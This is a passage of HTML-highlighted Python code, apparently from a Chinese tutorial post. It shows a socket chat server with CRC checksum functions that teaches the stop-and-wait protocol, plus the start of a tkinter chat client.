class="token punctuation">]</span> <span class="token comment">#存储聊天记录</span>Nickname <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token comment">#存储用户呢称</span>cnt <span class="token operator">=</span> <span class="token number">0</span> <span class="token comment">#当前客户端人数</span><span class="token keyword">print</span><span class="token punctuation">(</span>host<span class="token punctuation">)</span>server <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#创建server对象</span>server<span class="token punctuation">.</span>bind<span class="token punctuation">(</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span>port<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">#绑定</span>server<span class="token punctuation">.</span>listen<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#监听</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'服务器准备就绪！'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">TurnBin</span><span class="token punctuation">(</span>expression<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">'''将生成多项式转换为二进制字符串输出'''</span>    <span class="token comment"># 输入数据处理</span>    expression <span class="token operator">=</span> expression<span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 大写转换</span>    lis <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>expression<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"+"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 以加号为标志进行分割</span>    string <span class="token operator">=</span> lis<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>  <span class="token comment"># 多项式末尾的数字1</span>    <span class="token keyword">del</span> lis<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>    lis <span class="token operator">=</span> lis<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>  <span class="token comment"># 倒序</span>    <span class="token comment">##    print(lis)</span>    <span class="token comment"># 二进制转换</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>lis<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token builtin">int</span><span class="token punctuation">(</span>lis<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># 满足位数与变量的数字相同时</span>            string <span class="token operator">+=</span> <span class="token string">"1"</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>lis<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token builtin">len</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># 用0补全相差的位数</span>                string <span class="token operator">+=</span> <span class="token string">"0"</span>            string <span class="token operator">+=</span> <span class="token string">"1"</span>    <span class="token keyword">return</span> string<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">XOR</span><span class="token punctuation">(</span>string1<span class="token punctuation">,</span> string2<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">'''将两个二进制串进行异或操作，不同为1'''</span>    result <span class="token operator">=</span> <span class="token string">""</span>    <span class="token comment"># 输入数据处理</span>    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>string1<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token builtin">len</span><span class="token punctuation">(</span>string2<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># 若前者的位数不足时</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>string2<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token builtin">len</span><span class="token punctuation">(</span>string1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># 对string1的首位补0</span>            string1 <span class="token operator">=</span> <span class="token string">"0"</span> <span class="token operator">+</span> string1    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>string1<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin">len</span><span class="token punctuation">(</span>string2<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># 若后者的位数不足时</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>string1<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token builtin">len</span><span class="token punctuation">(</span>string2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># 对string2的首位补0</span>            string2 <span class="token operator">=</span> <span class="token string">"0"</span> <span class="token operator">+</span> string2    <span class="token comment">##    print(string1,string2)</span>    <span class="token comment"># 异或计算</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>string1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> string1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">!=</span> string2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">:</span>            result <span class="token operator">+=</span> <span class="token string">"1"</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            result <span class="token operator">+=</span> <span class="token string">"0"</span>    <span class="token comment">##    print(result)</span>    <span class="token comment"># 输出数据处理</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># 消除异或结果中的无效0</span>        <span class="token keyword">if</span> result<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"1"</span><span class="token punctuation">:</span>  <span class="token comment"># 找到第一个有效数据时</span>            <span class="token keyword">return</span> result<span class="token punctuation">[</span>i<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token punctuation">]</span>    <span class="token keyword">return</span> result<span class="token keyword">def</span> <span class="token function">CRC</span><span class="token punctuation">(</span>string<span class="token punctuation">,</span> expression<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">'''产生CRC校验码'''</span>    crc <span class="token operator">=</span> <span class="token string">""</span>  <span class="token comment"># 最终的crc校验码</span>    <span class="token comment"># 输入数据处理</span>    bin_expression <span class="token operator">=</span> TurnBin<span class="token punctuation">(</span>expression<span class="token punctuation">)</span>  <span class="token comment"># 转换为二进制串</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>bin_expression<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># 在二进制串末尾补0</span>        string <span class="token operator">+=</span> <span class="token string">"0"</span>    <span class="token comment">##    print(string,bin_expression)</span>    <span class="token comment"># CRC计算</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># 遍历被除数二进制串</span>        crc <span class="token operator">+=</span> string<span class="token punctuation">[</span>i<span class="token punctuation">]</span>        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>crc<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token builtin">len</span><span class="token punctuation">(</span>bin_expression<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># 当位数足够异或计算时</span>            crc <span class="token operator">=</span> XOR<span class="token punctuation">(</span>crc<span class="token punctuation">,</span> bin_expression<span class="token punctuation">)</span>    <span class="token comment">##    print(crc)</span>    <span class="token comment"># 输出数据处理</span>    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>crc<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token builtin">len</span><span class="token punctuation">(</span>bin_expression<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">:</span>  <span class="token comment"># 当crc位数不足时</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>bin_expression<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token builtin">len</span><span class="token punctuation">(</span>crc<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># 在首部补0</span>            crc <span class="token operator">=</span> <span class="token string">"0"</span> <span class="token operator">+</span> crc    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>crc<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin">len</span><span class="token punctuation">(</span>bin_expression<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">:</span>  <span class="token comment"># 当crc位数过多时</span>        crc <span class="token operator">=</span> crc<span class="token punctuation">[</span><span class="token builtin">len</span><span class="token punctuation">(</span>crc<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token builtin">len</span><span class="token punctuation">(</span>bin_expression<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token punctuation">]</span>  <span class="token comment"># 切片，消除首部多余的0</span>    <span class="token keyword">return</span> crc<span class="token keyword">def</span> <span class="token function">CheckCRC</span><span class="token punctuation">(</span>string<span class="token punctuation">,</span> expression<span class="token operator">=</span><span class="token string">'x4+x3+1'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># 检测传输数据是否正确，并打印结果</span>    <span class="token comment"># 输入数据处理</span>    bin_expression <span class="token operator">=</span> TurnBin<span class="token punctuation">(</span>expression<span class="token punctuation">)</span>  <span class="token comment"># 转换为二进制串</span>    right_crc <span class="token operator">=</span> string<span class="token punctuation">[</span><span class="token builtin">len</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token builtin">len</span><span class="token punctuation">(</span>bin_expression<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token punctuation">]</span>  <span class="token comment"># 原数据末尾的crc校验码</span>    <span class="token comment"># CRC计算</span>    crc <span class="token operator">=</span> CRC<span class="token punctuation">(</span>string<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token builtin">len</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token builtin">len</span><span class="token punctuation">(</span>bin_expression<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">,</span> expression<span class="token punctuation">)</span>    <span class="token comment"># 检验</span>    <span class="token keyword">if</span> right_crc <span class="token operator">==</span> crc<span class="token punctuation">:</span>  <span class="token comment"># 当尾部的CRC校验码，与首部数据生成的CRC校验码一致时</span>        word <span class="token operator">=</span><span class="token string">"数据传输过程正常..\n检测出的校验码："</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>crc<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'\n数据尾部校验码：'</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>right_crc<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        word <span class="token operator">=</span><span class="token string">"数据传输过程出错..\n检测出的校验码："</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>crc<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'\n数据尾部校验码：'</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>right_crc<span class="token punctuation">)</span>    <span class="token keyword">for</span> sock <span class="token keyword">in</span> SocketList<span class="token punctuation">:</span>        <span class="token comment"># sock.send((str(addr)+': '+content).encode('utf-8'))</span>        sock<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'Teacher: '</span> <span class="token operator">+</span> word<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#接收一个客户端连接，及其发送来数据</span><span class="token keyword">def</span> <span class="token function">read_client</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span>nickname<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token comment">#接受客户端发送来的数据</span>        <span class="token keyword">return</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">2048</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token comment">#客户端异常，连接失败，则删除该socket</span>        <span class="token comment"># print(str(addr)+'已下线！')</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>nickname <span class="token operator">+</span> <span class="token string">'已下线！'</span><span class="token punctuation">)</span>        SocketList<span class="token punctuation">.</span>remove<span class="token punctuation">(</span>s<span class="token punctuation">)</span>        Nickname<span class="token punctuation">.</span>remove<span class="token punctuation">(</span>nickname<span class="token punctuation">)</span>        <span class="token keyword">for</span> sock <span class="token keyword">in</span> SocketList<span class="token punctuation">:</span>            sock<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'系统消息：'</span> <span class="token operator">+</span> nickname <span class="token operator">+</span> <span class="token string">'已下线！'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#多线程：将收到的消息发送给所有客户端</span><span class="token keyword">def</span> <span class="token function">send_client</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span>nickname<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token comment"># s.send((','.join(Nickname)).encode('utf-8')) #将用户列表发送给各客户端</span>        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>            content <span class="token operator">=</span> read_client<span class="token punctuation">(</span>s<span class="token punctuation">,</span>nickname<span class="token punctuation">)</span> <span class="token comment">#客户端消息</span>            <span class="token keyword">if</span> content <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span> <span class="token comment">#如果没有结束循环</span>                <span class="token keyword">break</span>            <span class="token keyword">else</span><span class="token punctuation">:</span> <span class="token comment">#如果有将消息保存到历史记录</span>                <span class="token comment"># TextList.append(str(addr)+': '+content)</span>                TextList<span class="token punctuation">.</span>append<span class="token punctuation">(</span>nickname <span class="token operator">+</span> <span class="token string">': '</span> <span class="token operator">+</span> content<span class="token punctuation">)</span>            <span class="token comment">#将一个客户端发送过来的数据广播给其他客户端</span>            <span class="token keyword">for</span> sock <span class="token keyword">in</span> SocketList<span class="token punctuation">:</span>                <span class="token comment"># sock.send((str(addr)+': '+content).encode('utf-8'))</span>                sock<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token punctuation">(</span>nickname <span class="token operator">+</span> <span class="token string">': '</span> <span class="token operator">+</span> content<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            CheckCRC<span class="token punctuation">(</span>content<span class="token punctuation">)</span>    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token comment"># print(repr())</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'广播未成功！'</span><span class="token punctuation">)</span>QianYan <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token string">'你好呀！今天我们一起来学习SW。'</span><span class="token punctuation">,</span>           <span class="token string">'可靠传输机制是为了使数据可以正确稳定的传输和接收而制定的规则。'</span><span class="token punctuation">,</span>           <span class="token string">'流量控制是数据链路层的一种功能，流量控制对数据链路上的帧的发送速率进行控制，以使接收方有足够的缓冲空间来接受每个帧。'</span><span class="token punctuation">,</span>           <span class="token string">'流量控制的基本方法是由接收方控制发送方发送数据的速率。'</span><span class="token punctuation">,</span>           <span class="token string">'常见的流量控制方式有两种：`停止-等待协议、滑动窗口协议'</span><span class="token punctuation">,</span>           <span class="token string">'那么，让我们开始体验停止-等待协议SW的魅力吧！'</span><span class="token punctuation">,</span>           <span class="token string">'\n\n请输入高于4位的二进制数据'</span><span class="token punctuation">]</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    client<span class="token punctuation">,</span>addr <span class="token operator">=</span> server<span class="token punctuation">.</span>accept<span class="token punctuation">(</span><span class="token punctuation">)</span>    SocketList<span class="token punctuation">.</span>append<span class="token punctuation">(</span>client<span class="token punctuation">)</span>    nickname <span class="token operator">=</span> client<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">2048</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>    <span class="token comment"># print(str(addr)+'已加入！')</span>    <span class="token keyword">if</span> nickname <span class="token keyword">in</span> Nickname<span class="token punctuation">:</span>        i <span class="token operator">=</span> <span class="token number">1</span>        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> nickname<span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token keyword">in</span> Nickname<span class="token punctuation">:</span>                i <span class="token operator">=</span> i<span class="token operator">+</span><span class="token number">1</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                nickname <span class="token operator">=</span> nickname <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>                <span class="token keyword">break</span>    Nickname<span class="token punctuation">.</span>append<span class="token punctuation">(</span>nickname<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>nickname <span class="token operator">+</span> <span class="token string">'已加入！'</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> sock <span class="token keyword">in</span> SocketList<span class="token punctuation">:</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> QianYan<span class="token punctuation">:</span>            sock<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'Teacher: '</span> <span class="token operator">+</span> i<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    cnt <span class="token operator">=</span> cnt <span class="token operator">+</span> <span class="token number">1</span>    <span class="token comment">#每当有客户连接后，就启动一个线程为其服务</span>    <span class="token comment">#加入线程中跑，加入函数为send_client，参数为client,nickname</span>    threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>send_client<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>client<span class="token punctuation">,</span>nickname<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-py" data-language="py"><code class="language-py"><span class="token comment">#客户端</span><span class="token keyword">import</span> socket<span class="token keyword">import</span> threading<span class="token keyword">from</span> tkinter <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> tkinter<span class="token punctuation">.</span>messagebox <span class="token comment">#弹窗库</span><span class="token keyword">from</span> tkinter <span class="token keyword">import</span> scrolledtext  <span class="token comment">#滚动文本框</span>server_host <span class="token operator">=</span> socket<span class="token punctuation">.</span>gethostname<span class="token punctuation">(</span><span class="token punctuation">)</span>server_port <span class="token operator">=</span> <span class="token number">9999</span>client <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#创建socket对象</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Connecting......'</span><span class="token punctuation">)</span><span class="token comment">#登入窗口：输入呢称</span><span class="token keyword">def</span> <span class="token function">LoginWindow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    root <span class="token operator">=</span> Tk<span class="token punctuation">(</span><span class="token punctuation">)</span>    root<span class="token punctuation">.</span>title<span class="token punctuation">(</span><span class="token string">'一起来聊天 · 登录'</span><span class="token punctuation">)</span> <span class="token comment">#窗口标题</span>    root<span class="token punctuation">.</span>geometry<span class="token punctuation">(</span><span class="token string">'300x150'</span><span class="token punctuation">)</span> <span class="token comment">#窗口大小</span>    root<span class="token punctuation">.</span>geometry<span class="token punctuation">(</span><span class="token string">'+500+300'</span><span class="token punctuation">)</span> <span class="token comment">#改变窗体位置（‘+横坐标+纵坐标’）</span>    nickname <span class="token operator">=</span> StringVar<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#昵称变量（对象）:在使用界面编程的时候，有些时候是需要跟踪变量的值的变化，以保证值的变更随时可以显示在界面上</span>    root<span class="token punctuation">.</span>resizable<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment">#将窗口大小设置为不可变</span>    <span class="token comment">#登录函数（检查用户名是否为空，以及长度）</span>    <span class="token keyword">def</span> <span class="token function">Login_in</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        name <span class="token operator">=</span> nickname<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#????</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> name<span class="token punctuation">:</span>            tkinter<span class="token punctuation">.</span>messagebox<span class="token punctuation">.</span>showwarning<span class="token punctuation">(</span><span class="token string">'Warning'</span><span class="token punctuation">,</span> message<span class="token operator">=</span><span class="token string">'用户名为空！'</span><span class="token punctuation">)</span> <span class="token comment">#消息警告框</span>        <span class="token keyword">elif</span> <span class="token builtin">len</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">10</span><span class="token punctuation">:</span>            tkinter<span class="token punctuation">.</span>messagebox<span class="token punctuation">.</span>showwarning<span class="token punctuation">(</span><span class="token string">'Warning'</span><span class="token punctuation">,</span> message<span class="token operator">=</span><span class="token string">'用户名过长！最多为十个字符！'</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            root<span class="token punctuation">.</span>destroy<span class="token punctuation">(</span><span class="token punctuation">)</span>            client<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>server_host<span class="token punctuation">,</span> server_port<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 连接服务端，指定主机和端口</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Connecting is successful!'</span><span class="token punctuation">)</span>            client<span class="token punctuation">.</span>send<span class="token punctuation">(</span>name<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 传递用户昵称</span>            ChatRoom<span class="token punctuation">(</span>name<span class="token punctuation">)</span>  <span class="token comment"># 打开聊天窗口</span>    <span class="token comment">#登录按钮、输入提示标签、输入框</span>    Button<span class="token punctuation">(</span>root<span class="token punctuation">,</span> text<span class="token operator">=</span><span class="token string">"登录"</span><span class="token punctuation">,</span> command<span class="token operator">=</span>Login_in<span class="token punctuation">,</span> width<span class="token operator">=</span><span class="token number">8</span><span class="token punctuation">,</span> height<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span>place<span class="token punctuation">(</span>x<span class="token operator">=</span><span class="token number">100</span><span class="token punctuation">,</span> y<span class="token operator">=</span><span class="token number">90</span><span class="token punctuation">,</span> width<span class="token operator">=</span><span class="token number">100</span><span class="token punctuation">,</span> height<span class="token operator">=</span><span class="token number">35</span><span class="token punctuation">)</span>    Label<span class="token punctuation">(</span>root<span class="token punctuation">,</span> text<span class="token operator">=</span><span class="token string">'请输入昵称'</span><span class="token punctuation">,</span> font<span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">'Fangsong'</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>place<span class="token punctuation">(</span>x<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">,</span> y<span class="token operator">=</span><span class="token number">20</span><span class="token punctuation">,</span> height<span class="token operator">=</span><span class="token number">50</span><span class="token punctuation">,</span> width<span class="token operator">=</span><span class="token number">80</span><span class="token punctuation">)</span>    Entry<span class="token punctuation">(</span>root<span class="token punctuation">,</span> textvariable<span class="token operator">=</span>nickname<span class="token punctuation">,</span> font<span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">'Fangsong'</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>place<span class="token punctuation">(</span>x<span class="token operator">=</span><span class="token number">100</span><span class="token punctuation">,</span> y<span class="token operator">=</span><span class="token number">30</span><span class="token punctuation">,</span> height<span class="token operator">=</span><span class="token number">30</span><span class="token punctuation">,</span> width<span class="token operator">=</span><span class="token number">180</span><span class="token punctuation">)</span>    root<span class="token punctuation">.</span>mainloop<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#聊天窗口</span><span class="token keyword">def</span> <span class="token function">ChatRoom</span><span class="token punctuation">(</span>nickname<span class="token punctuation">)</span><span class="token punctuation">:</span>    root <span class="token operator">=</span> Tk<span class="token punctuation">(</span><span class="token punctuation">)</span>    root<span class="token punctuation">.</span>geometry<span class="token punctuation">(</span><span class="token string">'650x400'</span><span class="token punctuation">)</span>  <span class="token comment"># 窗口大小</span>    root<span class="token punctuation">.</span>resizable<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>  <span class="token comment"># 将窗口大小设置为不可变</span>    root<span class="token punctuation">.</span>geometry<span class="token punctuation">(</span><span class="token string">'+500+300'</span><span class="token punctuation">)</span>  <span class="token comment"># 改变窗体位置（‘+横坐标+纵坐标’）</span>    <span class="token comment"># content = client.recv(2048).decode('utf-8')</span>    <span class="token comment"># if content != 'No message.':</span>    <span class="token comment">#     past_text = content + '\n------以上是历史消息------\n'</span>    <span class="token comment"># 从服务器端获取当前用户列表</span>    <span class="token comment"># UserList = []</span>    <span class="token comment"># UserList = client.recv(2048).decode('utf-8').split(',')</span>    <span class="token comment"># UserList.insert(0, '------当前用户列表------')</span>    <span class="token comment"># 窗口标题</span>    <span class="token comment"># nickname = UserList[len(UserList)-1]</span>    root<span class="token punctuation">.</span>title<span class="token punctuation">(</span><span class="token string">'一起来聊天 · '</span> <span class="token operator">+</span> 